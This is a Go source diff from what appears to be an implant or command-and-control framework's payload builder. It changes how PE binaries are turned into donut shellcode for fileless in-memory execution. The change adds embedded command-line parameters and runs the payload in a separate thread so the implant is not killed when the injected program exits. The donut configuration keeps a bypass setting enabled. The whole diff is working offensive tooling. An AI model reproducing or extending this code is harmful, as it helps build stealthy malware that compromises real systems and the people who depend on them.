@@ -1127,7 +1127,7 @@ func (b *Builder) buildShellcode(opts BuildOptions) (*BuildResult, error) {
 		return nil, fmt.Errorf("failed to compile: %v", err)
 	}
 
-	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch)
+	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch, "")
 	if err != nil {
 		return nil, fmt.Errorf("failed to generate shellcode: %v", err)
 	}
@@ -1173,11 +1173,24 @@ func (b *Builder) buildShellcode(opts BuildOptions) (*BuildResult, error) {
 // ConvertToShellcode 将任意 PE 二进制（EXE/DLL）经 donut 转换为位置无关 shellcode，
 // 供"全内存无文件执行"管线在服务端完成 EXE→shellcode 转换后，交由植入端内存注入执行。
 func (b *Builder) ConvertToShellcode(binary []byte, arch string) ([]byte, error) {
-	return b.generateShellcodeWithDonut(binary, arch)
+	return b.generateShellcodeWithDonut(binary, arch, "")
+}
+
+// ConvertToShellcodeWithParams 同 ConvertToShellcode，但把 params 作为
+// 被转换程序的命令行参数一并嵌入（donut Parameters）。
+func (b *Builder) ConvertToShellcodeWithParams(binary []byte, arch, params string) ([]byte, error) {
+	return b.generateShellcodeWithDonut(binary, arch, params)
 }
 
 // generateShellcodeWithDonut generates shellcode using the donut library
-func (b *Builder) generateShellcodeWithDonut(binary []byte, arch string) ([]byte, error) {
+//
+// params 为传给被内存执行程序（EXE 命令行 / DLL 导出函数）的参数；
+// 受 donut 结构限制（Param[DONUT_MAX_NAME]）最长 255 字节，超长在这里直接报错，
+// 避免被静默截断成"参数没生效"。
+func (b *Builder) generateShellcodeWithDonut(binary []byte, arch, params string) ([]byte, error) {
+	if len(params) > 255 {
+		return nil, fmt.Errorf("内存执行参数过长（%d 字节，donut 上限 255）：请精简参数或改用落地执行", len(params))
+	}
 	targetArch := donut.X84
 	switch arch {
 	case "386":
@@ -1189,17 +1202,20 @@ func (b *Builder) generateShellcodeWithDonut(binary []byte, arch string) ([]byte
 	}
 
 	donutConfig := &donut.DonutConfig{
-		Arch:       targetArch,
-		InstType:   donut.DONUT_INSTANCE_PIC,
-		Type:       donut.DONUT_MODULE_EXE,
-		Entropy:    donut.DONUT_ENTROPY_DEFAULT,
-		Thread:     0, // 在当前线程中运行
-		Compress:   1,
-		Unicode:    0,
-		ExitOpt:    2, // ExitProcess
-		Format:     1,
-		Bypass:     3,
-		Parameters: "",
+		Arch:     targetArch,
+		InstType: donut.DONUT_INSTANCE_PIC,
+		Type:     donut.DONUT_MODULE_EXE,
+		Entropy:  donut.DONUT_ENTROPY_DEFAULT,
+		// Thread=1：把 EXE 入口点作为**独立线程**运行，植入体主线程不受影响；
+		// ExitOpt=1（退出线程）而非 2（退出宿主进程）——旧配置 Thread=0 + ExitOpt=2
+		// 会在内存执行的程序结束时调用 RtlExitUserProcess 把植入体一起干掉。
+		Thread:    1,
+		Compress:  1,
+		Unicode:   0,
+		ExitOpt:   1,
+		Format:    1,
+		Bypass:    3,
+		Parameters: params,
 	}
 
 	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(binary), donutConfig)
@@ -1216,7 +1232,7 @@ func (b *Builder) buildShellcodeBin(opts BuildOptions) (*BuildResult, error) {
 		return nil, fmt.Errorf("failed to compile: %v", err)
 	}
 
-	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch)
+	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch, "")
 	if err != nil {
 		return nil, fmt.Errorf("failed to generate shellcode: %v", err)
 	}
